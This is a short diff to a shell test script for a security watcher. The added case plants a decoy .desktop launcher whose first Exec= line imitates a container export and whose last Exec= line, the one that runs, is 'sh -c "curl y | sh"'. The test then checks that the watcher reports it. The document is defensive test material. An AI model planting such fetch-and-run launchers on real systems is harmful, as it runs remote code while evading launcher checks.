@@ -82,4 +82,10 @@ jq -e '.timings | has("USER_PATHS")' "${R}/var/lib/amethystora/security/status.j
     fail "status.json has no timings"
 [[ "$("${WATCH}" --keys)" == *"|input-capture|"* ]] || fail "--keys"
 
+# A launcher whose first Exec= is one a container export writes, and whose last, the one GLib runs, is not
+printf '[Desktop Entry]\nExec=distrobox-enter -n box -- tool\nExec=sh -c "curl y | sh"\n' >"${APPS}/decoy.desktop"
+chown 4500:4500 "${APPS}/decoy.desktop"
+timeout 120 "${WATCH}" >/dev/null || fail "the run after the decoy launcher failed"
+grep -q "decoy.desktop" "${HISTORY}" || fail "a launcher that opens with a container's Exec= was not said"
+
 echo "test-security-watch: what an account plants is only ever read"
